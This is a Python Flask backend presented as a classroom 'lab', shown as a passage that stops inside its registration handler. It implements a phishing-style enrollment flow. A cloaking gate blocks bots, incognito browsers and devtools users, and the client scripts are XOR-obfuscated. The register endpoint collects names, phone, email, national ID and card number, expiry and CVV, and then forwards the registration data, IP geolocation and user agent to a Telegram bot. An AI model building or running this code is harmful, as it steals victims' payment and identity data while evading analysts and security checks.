"""
Educational Flask lab — synthetic **Demo Co.** corporate enrollment with gate pipeline.

FOR AUTHORIZED CLASSROOM / DEFENSIVE-SECURITY TRAINING ONLY.
Not for deployment against real users. No real brand impersonation.

LOCAL ONLY: run on localhost / private lab network — do not publish to public platforms.
"""

from __future__ import annotations

from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
FRONTEND_DIR = PROJECT_ROOT / "frontend"

from dotenv import load_dotenv

load_dotenv(PROJECT_ROOT / ".env", override=True, interpolate=False)

import hashlib
import hmac
import json
import logging
import os
import re
import secrets
import threading
from urllib.parse import urlparse

from flask import (
    Flask,
    abort,
    jsonify,
    make_response,
    render_template,
    request,
    session,
)

from backend import (
    bango_hardening,
    checksum,
    gate_engine,
    incident_store,
    ip_geo,
    lab_shield,
    rsa_envelope,
    telegram_notify,
    ua_parse,
)

HANDOFF_COOKIE = "edu_demo_handoff"
SESSION_GATE = "gate_passed"
SESSION_FP = "fingerprint_hash"
SESSION_HANDOFF_EXPECTED = "handoff_expected"
SESSION_CORE_OK = "core_verified"
SESSION_REG = "registration_payload"
SESSION_APP_PATH = "expected_app_path"
SESSION_GATE_CSRF = "gate_csrf"
SESSION_GATE_POW_ID = "gate_pow_id"
SESSION_GATE_POW_ZEROS = "gate_pow_zeros"
SESSION_GATE_HANDSHAKE = "gate_handshake"
SESSION_API_CSRF = "api_csrf"
SESSION_UI_XOR_KEY = "ui_xor_key"
# Snapshot of User-Agent on successful ``POST /p``; optional :mod:`lab_shield` check on ``/api/*``
SESSION_CLIENT_UA = "client_ua_snapshot"
SESSION_BANGO_CSP = "bango_csp"
SESSION_BANGO_JS = "bango_js"

_rate_store: dict[str, list[float]] = {}


def _start_debug_key() -> str:
    """
    Shared secret query value for the instructor **gate debug** page (`/start?test=…`).

    **Security concept:** *Security through obscurity is weak* — this is only for
    local labs; change `DEMO_START_DEBUG_SECRET` and never expose this on the public web.
    """
    v = (os.environ.get("DEMO_START_DEBUG_SECRET") or "1234").strip()
    return v or "1234"


def _truthy_env(name: str) -> bool:
    """
    Parse boolean-like environment variables used for lab toggles.

    **Original PHP logic:** `getenv()` / `.env` switches consumed by `engine.php`.

    **Security concept:** *Feature flags* — instructors can tighten or relax checks
    per module without code edits (mirrors remote config in bot kits).
    """
    return os.environ.get(name, "").strip().lower() in ("1", "true", "yes", "on")


def _quiet_demonstration_terminal() -> bool:
    """If True: fewer Werkzeug access lines + no ``[DEMO REGISTER]`` in the dev terminal."""
    return _truthy_env("DEMO_QUIET_TERMINAL")


def _apply_quiet_terminal_if_configured() -> None:
    if not _quiet_demonstration_terminal():
        return
    for _name in ("werkzeug", "werkzeug.serving"):
        logging.getLogger(_name).setLevel(logging.ERROR)


def _int_env(name: str, default: int, min_v: int, max_v: int) -> int:
    """
    Integer .env for lab timing (SPA loading overlays, etc.).

    Empty or invalid → default. Result is clamped to [min_v, max_v].
    """
    raw = (os.environ.get(name) or "").strip()
    if not raw:
        return default
    try:
        v = int(raw, 10)
    except (TypeError, ValueError):
        return default
    return max(min_v, min(max_v, v))


def _bango_reg_loading_seconds() -> int:
    """Full-screen glass after successful register, before optional extra glass / success UI."""
    raw = (os.environ.get("DEMO_BANGO_REG_LOADING_SECONDS") or "").strip()
    if raw:
        return _int_env("DEMO_BANGO_REG_LOADING_SECONDS", 20, 1, 120)
    return _int_env("DEMO_SPA_REG_LOADING_SECONDS", 20, 1, 120)


def _bango_post_reg_extra_glass_seconds() -> int:
    """
    Optional second full-screen wait after the main register glass (0–120; ``0`` allowed).
    """
    raw = (os.environ.get("DEMO_BANGO_POST_REG_GLASS_SECONDS") or "").strip()
    if raw:
        return _int_env("DEMO_BANGO_POST_REG_GLASS_SECONDS", 0, 0, 120)
    return _int_env("DEMO_SPA_MFA_SUCCESS_LOADING_SECONDS", 0, 0, 120)


def _bango_done_redirect_delay_sec() -> int:
    raw = (os.environ.get("DEMO_BANGO_DONE_REDIRECT_DELAY_SEC") or "").strip()
    if raw:
        return _int_env("DEMO_BANGO_DONE_REDIRECT_DELAY_SEC", 3, 1, 30)
    return _int_env("DEMO_SPA_DONE_REDIRECT_DELAY_SEC", 3, 1, 30)


def _strict_origin_enabled() -> bool:
    """
    Return True when JSON POSTs must carry same-host Origin/Referer headers.

    **Original PHP logic:** Early `HTTP_ORIGIN` checks in `proc.php` before JSON decode.

    **Security concept:** *Cross-origin policy* — complements CSRF tokens by rejecting
    posts that lack a browser same-site navigation context.
    """
    return _truthy_env("DEMO_STRICT_ORIGIN")


def _origin_ok_for_request() -> bool:
    """
    Optionally enforce that `Origin` or `Referer` matches `Host`.

    **Original PHP logic:** Same-host checks around sensitive endpoints to reduce
    blind CSRF from attacker-controlled sites.

    **Security concept:** *Same-site policy hints* — not a full fix for CSRF alone
    but layers with tokens and custom headers.
    """
    if not _strict_origin_enabled():
        return True
    host = (request.host or "").lower()
    if not host:
        return False
    origin = (request.headers.get("Origin") or "").strip()
    referer = (request.headers.get("Referer") or "").strip()

    def _url_host_matches(u: str) -> bool:
        try:
            p = urlparse(u)
            return (p.netloc or "").lower() == host
        except Exception:
            return False

    if origin:
        return _url_host_matches(origin)
    if referer:
        return _url_host_matches(referer)
    return False


def _pow_leading_zeros() -> int:
    """
    Read PoW difficulty: count of leading hex zero digits required in SHA-256 digest.

    **Original PHP logic:** `POW_ZERO` style knob in gate `engine.php` templates.

    **Security concept:** *Adjustable client puzzle cost* — higher values burn more
    CPU on headless farms; too high harms legitimate mobile clients.
    """
    try:
        n = int(os.environ.get("DEMO_POW_LEADING_ZEROS_HEX", "4"))
    except ValueError:
        n = 4
    if n <= 0:
        return 0
    return min(8, max(2, n))


def _handoff_pepper() -> str:
    """
    Return server-only pepper mixed into HttpOnly handoff cookie verification.

    **Original PHP logic:** Server secret concatenated into `hash_hmac` bindings.

    **Security concept:** *Keyed verification* — prevents cookie forgery without the
    server secret even if an attacker guesses the random handoff token.
    """
    return os.environ.get("DEMO_HANDOFF_SECRET", "change-me-in-dotenv")


def _client_ip_for_lab() -> str:
    """
    Normalize loopback so ``::1`` and ``127.0.0.1`` share the same SQLite quota rows.

    **Security concept:** *Stable client identity in dual-stack localhost* — avoids
    split counters that make lifetime caps look “broken” during class demos.
    """
    raw = (request.remote_addr or "").strip() or "unknown"
    if raw in ("::1", "0:0:0:0:0:0:0:1"):
        return "127.0.0.1"
    return raw


def _gate_blocked_redirect_url() -> str | None:
    """
    Optional absolute URL (from ``DEMO_GATE_BLOCKED_REDIRECT_URL``) sent to the browser
    when the gate denies with ``lifetime_ip_cap``, ``incognito_blocked``, or
    ``external_guard_denied`` (when configured) so the client can navigate away.

    **Security concept:** *Allowlist URL scheme* — only ``http``/``https`` with a host
    are accepted to avoid ``javascript:`` open-redirect style abuse in the lab.
    """
    raw = (os.environ.get("DEMO_GATE_BLOCKED_REDIRECT_URL") or "").strip()
    raw = raw.strip("\ufeff\"'")
    if not raw:
        return None
    try:
        p = urlparse(raw)
    except Exception:
        return None
    if p.scheme not in ("http", "https") or not p.netloc:
        return None
    return p.geturl() or raw


def _read_guard_devtools_preference() -> str:
    """
    First set value among ``GUARD_DEVTOOLS``, ``guard_devtools``, ``DEMO_SHELL_GUARD``
    (order matters). Reads ``PROJECT_ROOT/.env`` on each call via :func:`get_key` so
    editing the file can take effect **without** restarting Flask (like external-guard
    hot values). If no key has a non-empty value in the file, falls back to
    ``os.environ`` (e.g. Docker / export), else ``1`` = guard on.
    """
    from dotenv import get_key

    keys = ("GUARD_DEVTOOLS", "guard_devtools", "DEMO_SHELL_GUARD")
    p = PROJECT_ROOT / ".env"
    if p.is_file():
        for k in keys:
            v = get_key(p, k)
            if v is None:
                continue
            t = (v or "").strip()
            if t == "":
                continue
            return t.lower()
    for k in keys:
        if k not in os.environ:
            continue
        t = (os.environ.get(k) or "").strip()
        if t == "":
            continue
        return t.lower()
    return "1"


def _shell_guard_enabled() -> bool:
    """
    When True, gate / Bango pages load ``shell-guard.js`` (right-click off, devtools
    heuristics, redirect to ``DEMO_GATE_BLOCKED_REDIRECT_URL`` if set).
    Toggles: ``GUARD_DEVTOOLS=0`` / ``1``, ``guard_devtools``, or legacy ``DEMO_SHELL_GUARD``
    (see :func:`_read_guard_devtools_preference`).
    """
    v = _read_guard_devtools_preference()
    return v not in ("0", "off", "false", "no", "")


def _bango_shell_inject_script_tags(report_csrf: str = "", csp_nonce: str = "") -> str:
    """Return Bango shell-guard config (``<script>`` with nonce; JS loads via XOR /s/ pipeline)."""
    if not _shell_guard_enabled():
        return ""
    from html import escape

    cfg = {
        "enabled": True,
        "blockedUrl": _gate_blocked_redirect_url() or "",
        "reportCsrf": report_csrf,
    }
    n = (csp_nonce or "").strip()
    open_tag = f'<script nonce="{escape(n)}">' if n else "<script>"
    return f"{open_tag}window.__DEMO_SHELL_GUARD__={json.dumps(cfg)}</script>\n"


def _bango_inject_shell_guard(html: str, report_csrf: str = "") -> str:
    """
    Insert shell-guard config + script into ``bango.html`` (placeholder token).
    Reuses the same allowlisted URL as server-side block UX (``DEMO_GATE_BLOCKED_REDIRECT_URL``).
    ``report_csrf`` is ``SESSION_API_CSRF`` for ``POST /api/demo/shell-guard-deny`` logging.
    """
    inject = _bango_shell_inject_script_tags(report_csrf)
    if not inject:
        return html.replace("__DEMO_BANGO_SHELL_INJECT__", "")
    return html.replace("__DEMO_BANGO_SHELL_INJECT__", inject)


def _bango_done_redirect_url() -> str | None:
    """
    After Bango shows the final success step, the browser may navigate here.

    **Security concept:** Same allowlist as :func:`_gate_blocked_redirect_url` —
    only ``http``/``https`` with a host.
    """
    raw = (
        os.environ.get("DEMO_BANGO_DONE_REDIRECT_URL")
        or os.environ.get("DEMO_SPA_DONE_REDIRECT_URL")
        or ""
    ).strip()
    raw = raw.strip("\ufeff\"'")
    if not raw:
        return None
    try:
        p = urlparse(raw)
    except Exception:
        return None
    if p.scheme not in ("http", "https") or not p.netloc:
        return None
    return p.geturl() or raw


def _incognito_api_blocked_response():
    """
    403 for ``/api/demo/register`` when incognito is blocked.
    Reuses :func:`_gate_blocked_redirect_url` (same as ``POST /p``) so the client can redirect.
    """
    away = _gate_blocked_redirect_url()
    body: dict = {
        "ok": False,
        "error": "incognito_blocked",
        "reason": "incognito_blocked",
    }
    if away:
        body["redirect_url"] = away
    else:
        body["redirect_missing"] = True
        body["hint"] = (
            "incognito_blocked: set DEMO_GATE_BLOCKED_REDIRECT_URL in .env to an "
            "https:// URL, then restart the Flask process."
        )
    resp = make_response(jsonify(body), 403)
    if away:
        resp.headers["X-Edu-Blocked-Redirect"] = away
    return resp


def build_random_app_path() -> str:
    """
    Build a high-entropy path segment pair (original: `gate_build_redirect_url()`).

    **Security concept:** *URL hiding / session binding* — reduces drive-by replay
    of static core URLs; only the server-issued path unlocks the shell.

    Default shell is **bango** (RTL lab UI).
    """
    parts = [
        "portal",
        "workspace",
        "session",
        "client-area",
        "app-hub",
    ]
    p1 = secrets.choice(parts)
    others = [p for p in parts if p != p1]
    p2 = secrets.choice(others)
    a = p1 + "-" + secrets.token_hex(4)
    b = p2 + "-" + secrets.token_hex(3)
    return f"/{a}/{b}/bango"


def _issued_path_base(issued_app_url: str) -> str:
    """From session ``.../a/b/bango`` return ``/a/b`` (must match the gate-issued link)."""
    s = (issued_app_url or "").strip()
    if s.endswith("/bango"):
        return s[: -len("/bango")]
    return s


def _normalize_card_expiry(raw: str) -> str | None:
    """
    Accept ``MM/YY`` or four digits ``MMYY``; return canonical ``MM/YY`` or None.
    """
    s = (raw or "").strip().replace(" ", "")
    if not s:
        return None
    mm: str
    yy: str
    if re.fullmatch(r"\d{2}/\d{2}", s):
        mm, yy = s.split("/", 1)
    elif re.fullmatch(r"\d{4}", s):
        mm, yy = s[:2], s[2:]
    else:
        return None
    try:
        m = int(mm)
    except ValueError:
        return None
    if m < 1 or m > 12:
        return None
    return f"{mm}/{yy}"


def _send_lab_telegram(html_message: str) -> None:
    """If Telegram env is set, POST one HTML ``sendMessage`` (no-op otherwise)."""
    t_tok = (os.environ.get("DEMO_TELEGRAM_BOT_TOKEN") or "").strip()
    t_chat = (os.environ.get("DEMO_TELEGRAM_CHAT_ID") or "").strip()
    if not t_tok or not t_chat:
        return
    telegram_notify.send_telegram_html(
        t_tok,
        t_chat,
        html_message,
        message_thread_id=(os.environ.get("DEMO_TELEGRAM_THREAD_ID") or "").strip() or None,
    )


def _spawn_telegram_after_register(
    app: Flask,
    payload: dict,
    client_ip: str,
    user_agent: str | None,
    *,
    done_redirect_url: str = "",
) -> None:
    """
    IP geo + Telegram can take 10+ seconds. Run in a background thread so the
    /api/demo/register response returns quickly; the browser wait is then
    governed by ``loading_seconds`` (Bango reg glass), not by HTTP latency.
    """

    def _work() -> None:
        with app.app_context():
            try:
                geo = ip_geo.lookup_ip_public(client_ip)
                _send_lab_telegram(
                    telegram_notify.format_demo_registration_message(
                        payload,
                        client_ip=client_ip,
                        user_agent=user_agent,
                        ip_geo=geo,
                        done_redirect_url=done_redirect_url,
                    )
                )
            except Exception as e:
                app.logger.info("async telegram (register): %s", e)

    threading.Thread(target=_work, daemon=True).start()


def create_app() -> Flask:
    """
    Application factory wiring routes to **gate_engine**, **checksum**, and SQLite.

    **Original PHP logic:** Monolithic `index.php` + includes; Flask splits concerns
    but preserves the gate processor flow and the Bango enrollment UI.
    """
    app = Flask(
        __name__,
        static_folder=str(FRONTEND_DIR / "static"),
        template_folder=str(FRONTEND_DIR / "templates"),
    )
    app.secret_key = os.environ.get("FLASK_SECRET_KEY", "dev-only-change-me")
    app.config.update(
        SESSION_COOKIE_HTTPONLY=True,
        SESSION_COOKIE_SAMESITE=os.environ.get("DEMO_SESSION_SAMESITE") or "Strict",
        SESSION_COOKIE_SECURE=_truthy_env("DEMO_COOKIE_SECURE"),
    )

    incident_store.init_incident_db(PROJECT_ROOT)
    gate_engine.set_runtime_dotenv_path(PROJECT_ROOT / ".env")
    _apply_quiet_terminal_if_configured()
    lab_shield.init_app(app, SESSION_CLIENT_UA=SESSION_CLIENT_UA)

    @app.context_processor
    def _bango_dynamic_class_map():
        if (request.endpoint or "") != "core_bango":
            return {}
        if session.get(SESSION_GATE) is not True:
            return {}
        from backend import bango_template

        return bango_template.build_bango_template_context(session)

    @app.after_request
    def _security_headers(resp):
        """
        Attach baseline browser security headers on every response.

        **Security concept:** *Browser-side hardening headers* — reduces MIME sniffing,
        clickjacking, and referrer leakage; kits often omit these, which helps defenders.
        """
        resp.headers.setdefault("X-Content-Type-Options", "nosniff")
        resp.headers.setdefault("X-Frame-Options", "DENY")
        resp.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
        return resp

    @app.route("/start")
    def start():
        """
        Issue gate session artifacts (CSRF, PoW id, handshake nonce, XOR key).

        **Original PHP logic:** `start.php` rendering gate HTML with embedded challenges.

        Query **`?test=<DEMO_START_DEBUG_SECRET>`** (default `1234`) shows a local-only
        debug dashboard: rate-limit bucket + recent `gate_decision` rows from SQLite.
        """
        if (request.args.get("test") or "").strip() == _start_debug_key():
            ip = _client_ip_for_lab()
            rate = gate_engine.rate_limit_snapshot(ip, _rate_store)
            rows = incident_store.fetch_gate_audit_for_ip(PROJECT_ROOT, ip, limit=60)
            n_denied = sum(1 for r in rows if r.get("allowed") is False)
            n_allowed = sum(1 for r in rows if r.get("allowed") is True)
            lifetime = incident_store.count_gate_decisions_for_ip(PROJECT_ROOT, ip)
            _lc = incident_store.count_gate_lifetime_quota_used(PROJECT_ROOT, ip)
            _cap = gate_engine.lifetime_gate_max()
            gate_quota = {"current": _lc, "max": _cap, "exhausted": _lc >= _cap}
            ua_hdr = request.headers.get("User-Agent") or ""
            ua_details = ua_parse.parse_user_agent(ua_hdr)
            return render_template(
                "start_debug.html",
                client_ip=ip,
                user_agent=ua_hdr,
                ua_details=ua_details,
                rate=rate,
                gate_quota=gate_quota,
                gate_blocked_redirect=_gate_blocked_redirect_url(),
                external_guard=gate_engine.external_guard_runtime_status(),
                rows=rows,
                counts={"allowed": n_allowed, "denied": n_denied, "total": len(rows)},
                lifetime=lifetime,
                debug_key=_start_debug_key(),
            )

        csrf = secrets.token_urlsafe(32)
        pow_id = secrets.token_hex(10)
        pow_zeros = _pow_leading_zeros()
        handshake = secrets.token_urlsafe(24)
        xor_key = secrets.token_hex(8)
        session[SESSION_GATE_CSRF] = csrf
        session[SESSION_GATE_POW_ID] = pow_id
        session[SESSION_GATE_POW_ZEROS] = pow_zeros
        session[SESSION_GATE_HANDSHAKE] = handshake
        session[SESSION_UI_XOR_KEY] = xor_key
        session.modified = True
        hmac_secret = os.environ.get("DEMO_GATE_HMAC_SECRET", "")
        ui_labels = ["gate-status"]
        ui_map = gate_engine.build_ui_class_map(ui_labels, xor_key)
        return render_template(
            "gate.html",
            csrf_token=csrf,
            pow_id=pow_id,
            pow_zero_hex=pow_zeros,
            hmac_secret=hmac_secret,
            handshake_nonce=handshake,
            ui_xor_key=xor_key,
            ui_class_map=json.dumps(ui_map),
            gate_blocked_redirect=_gate_blocked_redirect_url(),
            shell_guard=_shell_guard_enabled(),
        )

    @app.post("/p")
    def gate_post():
        """
        Gate processor endpoint (strict port of `proc.php` JSON dispatcher).

        Runs `gate_engine.process_gate_submission` and logs forensic rows on deny/allow.
        """
        if not _origin_ok_for_request():
            incident_store.insert_incident(
                PROJECT_ROOT,
                event_type="gate_decision",
                client_ip=_client_ip_for_lab(),
                user_agent=request.headers.get("User-Agent"),
                session_id=None,
                payload={
                    "allowed": False,
                    "reason": "bad_origin",
                    "risk": {},
                    "phase": "pre_pipeline",
                },
            )
            return jsonify({"status": "blocked", "reason": "bad_origin"}), 403

        raw = request.get_data(as_text=True) or "{}"
        try:
            body = json.loads(raw)
        except json.JSONDecodeError:
            incident_store.insert_incident(
                PROJECT_ROOT,
                event_type="gate_decision",
                client_ip=_client_ip_for_lab(),
                user_agent=request.headers.get("User-Agent"),
                session_id=None,
                payload={
                    "allowed": False,
                    "reason": "bad_json",
                    "risk": {},
                    "phase": "pre_pipeline",
                },
            )
            return jsonify({"status": "blocked", "reason": "bad_json"}), 400

        decision = gate_engine.process_gate_submission(
            client_ip=_client_ip_for_lab(),
            host_header=request.headers.get("Host"),
            user_agent=request.headers.get("User-Agent"),
            body=body,
            gate_csrf=session.get(SESSION_GATE_CSRF),
            gate_pow_id=session.get(SESSION_GATE_POW_ID),
            gate_pow_zeros=int(session.get(SESSION_GATE_POW_ZEROS) or 0),
            gate_handshake=session.get(SESSION_GATE_HANDSHAKE),
            rate_store=_rate_store,
            hmac_secret=os.environ.get("DEMO_GATE_HMAC_SECRET", ""),
            quota_sql_root=PROJECT_ROOT,
        )

        gate_phase = (
            "external_guard" if decision.reason == "external_guard_denied" else "pipeline"
        )
        incident_store.insert_incident(
            PROJECT_ROOT,
            event_type="gate_decision",
            client_ip=_client_ip_for_lab(),
            user_agent=request.headers.get("User-Agent"),
            session_id=None,
            payload={
                "allowed": decision.allowed,
                "reason": decision.reason,
                "risk": decision.risk,
                "phase": gate_phase,
                "body_meta": {
                    "has_fp": bool(body.get("fingerprint_hash")),
                    "has_fp_sig": isinstance(body.get("fingerprint_signals"), dict),
                    "has_bh_sig": isinstance(body.get("behavior_signals"), dict),
                },
            },
        )

        if not decision.allowed:
            blocked_body: dict = {"status": "blocked", "reason": decision.reason, "risk": decision.risk}
            if decision.reason == "external_guard_denied":
                ext_txt = ""
                if isinstance(decision.risk, dict):
                    ext_txt = str(decision.risk.get("external_reason") or "").strip()
                blocked_body["code"] = "external_guard_denied"
                blocked_body["reason"] = ext_txt or "denied"
            away: str | None = None
            if decision.reason in (
                "lifetime_ip_cap",
                "external_guard_denied",
                "incognito_blocked",
            ):
                away = _gate_blocked_redirect_url()
                if away:
                    blocked_body["redirect_url"] = away
                else:
                    blocked_body["redirect_missing"] = True
                    blocked_body["hint"] = (
                        f"{decision.reason}: set DEMO_GATE_BLOCKED_REDIRECT_URL in .env to an "
                        "https:// URL, then restart the Flask process."
                    )
            blocked_resp = make_response(jsonify(blocked_body), decision.http_status)
            if away:
                blocked_resp.headers["X-Edu-Blocked-Redirect"] = away
            return blocked_resp

        fp = str(body.get("fingerprint_hash") or "").strip()

        session.pop(SESSION_GATE_CSRF, None)
        session.pop(SESSION_GATE_POW_ID, None)
        session.pop(SESSION_GATE_POW_ZEROS, None)
        session.pop(SESSION_GATE_HANDSHAKE, None)
        session.pop(SESSION_UI_XOR_KEY, None)

        handoff = secrets.token_hex(24)
        pepper = _handoff_pepper()
        expected = hashlib.sha256(f"{handoff}|{fp}|{pepper}".encode()).hexdigest()

        session.clear()
        session[SESSION_GATE] = True
        session[SESSION_FP] = fp
        session[SESSION_HANDOFF_EXPECTED] = expected

        path = build_random_app_path()
        session[SESSION_APP_PATH] = path
        session[SESSION_API_CSRF] = secrets.token_urlsafe(32)
        session[SESSION_CLIENT_UA] = (request.headers.get("User-Agent") or "")[:512]
        redirect_url = f"{request.scheme}://{request.host}{path}"

        resp = make_response(
            jsonify(
                {
                    "status": "access_granted",
                    "redirect_url": redirect_url,
                    "risk": decision.risk,
                }
            )
        )
        resp.set_cookie(
            HANDOFF_COOKIE,
            handoff,
            max_age=300,
            httponly=True,
            samesite=app.config.get("SESSION_COOKIE_SAMESITE", "Lax"),
            secure=bool(app.config.get("SESSION_COOKIE_SECURE")) or request.is_secure,
            path="/",
        )
        return resp

    @app.route("/<string:seg1>/<string:seg2>/bango")
    def core_bango(seg1: str, seg2: str):
        """
        Shell after gate: ``bango.html`` (RTL lab UI) with HttpOnly one-time handoff.
        """
        return _serve_core_shell_app(seg1, seg2, "bango.html")

    def _bango_response_html() -> object:
        resp = make_response(
            render_template("bango.html"),
            200,
            {"Content-Type": "text/html; charset=utf-8"},
        )
        csp = session.pop(SESSION_BANGO_CSP, None)
        if csp and isinstance(csp, str) and csp.strip():
            resp.headers["Content-Security-Policy"] = csp.strip()
        return resp

    @app.get("/s/<string:file_token>")
    def bango_serve_obfuscated_js(file_token: str):
        """
        XOR-obfuscated Bango lab scripts (fingerprint, behavior, shell-guard);
        key and tokens are session-bound to the Bango page render.
        """
        if session.get(SESSION_GATE) is not True or session.get(SESSION_CORE_OK) is not True:
            abort(404)
        b = session.get(SESSION_BANGO_JS) or {}
        rev: dict = b.get("rev") or {}
        k = b.get("k") or ""
        logical = rev.get(file_token) if rev else None
        if not logical or not k:
            abort(404)
        name_map = {
            "fingerprint": "fingerprint.js",
            "behavior": "behavior.js",
            "shell-guard": "shell-guard.js",
        }
        fn = name_map.get(str(logical))
        if not fn:
            abort(404)
        path = FRONTEND_DIR / "static" / "js" / fn
        if not path.is_file():
            abort(404)
        body = path.read_text(encoding="utf-8")
        raw = bango_hardening.xor_string_to_bytes(body, str(k))
        resp = make_response(raw, 200)
        resp.headers["Content-Type"] = "application/octet-stream"
        resp.headers["Cache-Control"] = "no-store, private"
        return resp

    def _serve_core_shell_app(seg1: str, seg2: str, static_filename: str):
        if session.get(SESSION_GATE) is not True:
            return ("Gate not passed. Open /start first.", 403)

        expected_path = session.get(SESSION_APP_PATH) or ""
        current_base = f"/{seg1}/{seg2}"
        issued_base = _issued_path_base(expected_path)
        if expected_path and current_base != issued_base:
            return ("URL does not match issued redirect (replay / bookmark mismatch).", 404)

        def _static_or_bango() -> object:
            if static_filename == "bango.html":
                return _bango_response_html()
            return app.send_static_file(static_filename)

        if session.get(SESSION_CORE_OK) is True:
            return _static_or_bango()

        exp = session.get(SESSION_HANDOFF_EXPECTED) or ""
        token = request.cookies.get(HANDOFF_COOKIE, "")
        fp = session.get(SESSION_FP) or ""
        pepper = _handoff_pepper()
        calc = hashlib.sha256(f"{token}|{fp}|{pepper}".encode()).hexdigest()
        if not token or not hmac.compare_digest(exp, calc):
            return ("Invalid or missing handoff cookie.", 403)

        session.pop(SESSION_HANDOFF_EXPECTED, None)
        resp = _static_or_bango()
        resp.set_cookie(
            HANDOFF_COOKIE,
            "",
            max_age=0,
            httponly=True,
            samesite=app.config.get("SESSION_COOKIE_SAMESITE", "Lax"),
            secure=bool(app.config.get("SESSION_COOKIE_SECURE")) or request.is_secure,
            path="/",
        )
        session[SESSION_CORE_OK] = True
        if not session.get(SESSION_API_CSRF):
            session[SESSION_API_CSRF] = secrets.token_urlsafe(32)
        return resp

    @app.get("/api/demo/csrf")
    def api_csrf():
        """
        Expose per-session API CSRF token for JSON POSTs after the Bango shell unlocks.

        **Original PHP logic:** AJAX endpoint returning hidden form token for XHR.

        **Security concept:** *Session-scoped secret for mutating operations* — token
        rotation per gate success narrows replay windows.
        """
        if session.get(SESSION_CORE_OK) is not True:
            return jsonify({"ok": False, "error": "session"}), 403
        tok = session.get(SESSION_API_CSRF)
        if not tok:
            tok = secrets.token_urlsafe(32)
            session[SESSION_API_CSRF] = tok
        return jsonify({"ok": True, "csrf": tok})

    @app.post("/api/demo/shell-guard-deny")
    def api_shell_guard_deny():
        """
        Browser reports that client shell-guard will redirect (devtools heuristics).
        Inserts a ``gate_decision`` row so ``/start?test=`` debug audit shows the reason.
        """
        if not _shell_guard_enabled():
            return jsonify({"ok": False, "error": "disabled"}), 404
        if not _origin_ok_for_request():
            return jsonify({"ok": False, "error": "origin"}), 403
        if not request.is_json:
            return jsonify({"ok": False, "error": "json"}), 400
        body = request.get_json(silent=True) or {}
        sub = str(body.get("subreason") or "unknown").strip()[:64]
        tok = (request.headers.get("X-CSRF-Token") or "").strip()
        ok_csrf = False
        api_t = session.get(SESSION_API_CSRF)
        gate_t = session.get(SESSION_GATE_CSRF)

        def _csrf_match(expected: str | None) -> bool:
            if not expected or not tok:
                return False
            a, b = str(expected), str(tok)
            if len(a) != len(b):
                return False
            return hmac.compare_digest(a, b)

        if _csrf_match(api_t):
            ok_csrf = True
        if not ok_csrf and _csrf_match(gate_t):
            ok_csrf = True
        if not ok_csrf:
            return jsonify({"ok": False, "error": "csrf"}), 403
        incident_store.insert_incident(
            PROJECT_ROOT,
            event_type="gate_decision",
            client_ip=_client_ip_for_lab(),
            user_agent=request.headers.get("User-Agent"),
            session_id=None,
            payload={
                "allowed": False,
                "reason": "shell_guard_devtools",
                "phase": "client_shell_guard",
                "risk": {"subreason": sub, "source": "shell_guard"},
            },
        )
        return jsonify({"ok": True})

    @app.get("/api/demo/flow")
    def api_demo_flow():
        """
        Bango: whether registration is already in session; when present, same
        done-redirect fields as in the register JSON response.
        """
        if session.get(SESSION_CORE_OK) is not True:
            return jsonify({"ok": False, "error": "session"}), 403
        has_reg = bool(session.get(SESSION_REG))
        out: dict[str, object] = {
            "ok": True,
            "has_registration": has_reg,
        }
        if has_reg:
            _done = _bango_done_redirect_url() or ""
            out["message"] = "Registration complete (Bango lab)."
            out["redirect_url"] = _done
            out["spa_done_redirect"] = _done
            out["done_check_seconds"] = _bango_done_redirect_delay_sec()
        return jsonify(out)

    def _api_csrf_ok() -> bool:
        """
        Constant-time compare of `X-CSRF-Token` against session-bound API token.

        **Original PHP logic:** Header token vs session in `post.php` / API routers.

        **Security concept:** *Double-submit / custom header CSRF* — JSON endpoints
        ignore simple form POST CSRF unless attacker also reads SameSite session cookies.
        """
        if _truthy_env("DEMO_API_CSRF_DISABLED"):
            return True
        exp = session.get(SESSION_API_CSRF) or ""
        got = (request.headers.get("X-CSRF-Token") or "").strip()
        return bool(exp and got and hmac.compare_digest(exp, got))

    @app.post("/api/demo/register")
    def api_register():
        """
        Accept profile fields (fname, lname, phone, email, personal id) plus card-style
        fields (full name, PAN, expiry, CVV). PAN must pass Luhn; CVV is never persisted
        as plaintext (length only). Logs a synthetic incident row. Response drives the
        Bango glass overlays and success step (no second-factor API).
        """
        if session.get(SESSION_CORE_OK) is not True:
            return jsonify({"ok": False, "error": "session"}), 403
        if not _origin_ok_for_request():
            return jsonify({"ok": False, "error": "bad_origin"}), 403
        if not _api_csrf_ok():
            return jsonify({"ok": False, "error": "bad_csrf"}), 403
        try:
            data = request.get_json(force=True, silent=False)
        except Exception:
            return jsonify({"ok": False, "error": "json"}), 400

        if bango_hardening.honeypot_filled(data):
            return jsonify({"ok": False, "error": "honeypot_filled"}), 400

        pii_err = rsa_envelope.apply_decrypted_pii_to_request(data)
        if pii_err is not None:
            return jsonify({"ok": False, "error": "bad_encrypted_pii"}), 400

        fp_sig = data.get("fingerprint_signals")
        if not isinstance(fp_sig, dict):
            fp_sig = {}
        cf = data.get("client_flags")
        if not isinstance(cf, dict):
            cf = {}
        beh = data.get("behavior_signals")
        if bango_hardening.cdp_or_automation_suspect(cf):
            return jsonify({"ok": False, "error": "automation_suspect"}), 400
        if bango_hardening.battery_full_charging_desktop_suspect(cf, fp_sig):
            return jsonify({"ok": False, "error": "battery_anomaly"}), 400
        if bango_hardening.keystroke_intervals_too_robotic(beh):
            return jsonify({"ok": False, "error": "keystroke_synthetic"}), 400

        _webrtc_ips = bango_hardening.webrtc_host_candidate_ips(fp_sig)
        if _webrtc_ips and not _quiet_demonstration_terminal():
            app.logger.info("Bango webrtc host candidates: %s", ",".join(_webrtc_ips))

        r_inc = gate_engine.step_incognito_detection(cf, fp_sig)
        if r_inc is not None and not r_inc.allowed:
            return _incognito_api_blocked_response()

        fname = str(data.get("fname") or "").strip()[:120]
        lname = str(data.get("lname") or "").strip()[:120]
        phone = str(data.get("phone") or "").strip()[:32]
        email = str(data.get("email") or "").strip()[:254]
        personal_id = str(data.get("personal_id") or "").strip()[:32]
        full_name = str(data.get("full_name") or "").strip()[:120]
        if not fname or not lname or not phone or not email or not personal_id:
            return jsonify({"ok": False, "error": "bad_profile_fields"}), 400
        if len(personal_id) < 2:
            return jsonify({"ok": False, "error": "bad_personal_id_length"}), 400
        if not full_name or len(full_name) < 2:
            return jsonify({"ok": False, "error": "bad_full_name"}), 400

